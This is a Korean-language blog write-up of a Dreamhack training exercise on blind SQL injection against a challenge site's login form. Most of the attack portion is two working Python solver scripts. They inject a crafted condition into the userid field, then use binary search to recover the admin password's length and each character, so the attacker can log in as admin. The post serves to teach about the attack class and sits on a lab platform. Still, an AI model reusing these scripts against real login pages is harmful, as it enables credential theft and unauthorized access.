---
title: Dreamhack Exercise Blind SQL Injection
date: 2022-02-21 15:26:07
tags: Dreamhack
categories: Dreamhack
---

## 서비스 요약
- /login : 이용자에게 ID 와 비밀번호를 입력받고 이를 데이터베이스에서 조회하여 이용자를 인증합니다

## Blind SQL Injection
비밀번호는 SQLite 의 users 테이블에 있으므로 , 이 테이블의 값을 읽는 Blind SQL Injection 코드를 작성하겠습니다

지난 SQL Injection 코스에서 이야기 한 것처러 Blind SQL Injection 은 여러 번의 질의를 통해 정답을 찾아내는 스무고개 놀이와 비슷합니다

비밀번호를 구성할 수 있는 문자를 출력 가능한 아스키 문자로 제한했을 때 한자리에 들어갈 수 있는 문자의 종류는 94 (0x20 ~ 0x7E)개입니다. ✨아스키 테이블을 확인해보세요. 

비밀번호가 10 자리만 되어도 가능한 경우의 수가 94 10 ≃5×10 19 개에 이릅니다

다행히 쿼리르 잘 이용하면 각 자리를 따로 조사할 수 있으므로 실제로 전송해야할 최대 쿼리의 갯수는 940 = 94 x 10 로 줄어듭니다

이분 탐색 알고리즘을 적용하면 log2 94 x 10 = 65 개로 더욱 축소됩니다

적어보일 수 있지만 여전히 직접 시도하기에는 많습니다
더욱이 비밀번호의 길이가 이보다 길수도 있으므로 자동화 스크립트를 작성하는 것이 바람직합니다

### 로그인 요청의 폼 구조 파악
쿼리를 자동화 하려면 로그인할 때 전송하는 POST 데이터의 구조를 파악해야 합니다

1. 개발자 도구의 네트워크 탭 열고, Preserve log 클릭
2. userid에 guest, password에 guest를 입력하고 login 버튼 클릭
3. 메세지 목록에서 /login으로 전송된 POST 요청 찾기
4. 하단의 Form Data 확인

로그인할 때 입력한 userid 값은 userid로 password는 userpassword로 전송됨을 확인할 수 있습니다

## 비밀번호 길이 파악
비밀번호를 알아내기 전에 길이를 먼저 파악하겠습니다
다음과 같이 admin 의 비밀번호 길이를 찾아내는 파이썬 스크립트를 작성해보세요

Figure2 비밀번호 길이 구하기

```python
#!/usr/bin/python3.9
import requests
import sys
from urllib.parse import urljoin
class Solver:
    """Solver for simple_SQLi challenge"""
    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host1.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> bool:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        resp = requests.post(self._login_url, data=login_data)
        return resp
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
        return resp
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2
            if low+1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid
    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len
    def solve(self):
        pw_len = solver._find_password_length("admin")
        print(f"Length of admin password is: {pw_len}")
if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()
```

## 비밀번호 획득
비밀번호의 길이를 찾았으므로 이제 한 글자씩 비밀번호를 알아내는 코드를 작성하겠습니다
이진 탐색 알고리즘을 활용하면 시간을 단축할 수 있습니다

Figure4 정답 예제

```python
#!/usr/bin/python3.9
import requests
import sys
from urllib.parse import urljoin
class Solver:
    """Solver for simple_SQLi challenge"""
    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host1.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> requests.Response:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        resp = requests.post(self._login_url, data=login_data)
        return resp
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
        return resp
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2
            if low+1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid
    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\") < {{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len
    def _find_password(self, user: str, pw_len: int) -> str:
        pw = ''
        for idx in range(1, pw_len+1):
            query_tmpl = f"((SELECT SUBSTR(userpassword,{idx},1) WHERE userid=\"{user}\") < CHAR({{val}}))"
            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2f, 0x7e))
            print(f"{idx}. {pw}")
        return pw
    def solve(self) -> None:
        # Find the length of admin password
        pw_len = solver._find_password_length("admin")
        print(f"Length of the admin password is: {pw_len}")
        # Find the admin password
        print("Finding password:")
        pw = solver._find_password("admin", pw_len)
        print(f"Password of the admin is: {pw}")
if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()
```

## 플래그 획득
![SQL](https://kr.object.ncloudstorage.com/dreamhack-content/page/c0c8073300fcd6b38f0718448d278f5080f74202a0d28469d169e03aa5fc8234.png)

획득한 비밀번호를 이용하여 admin 으로 로그인하면 플래그를 획득할 수 있습니다

## Reference
Reference : https://dreamhack.io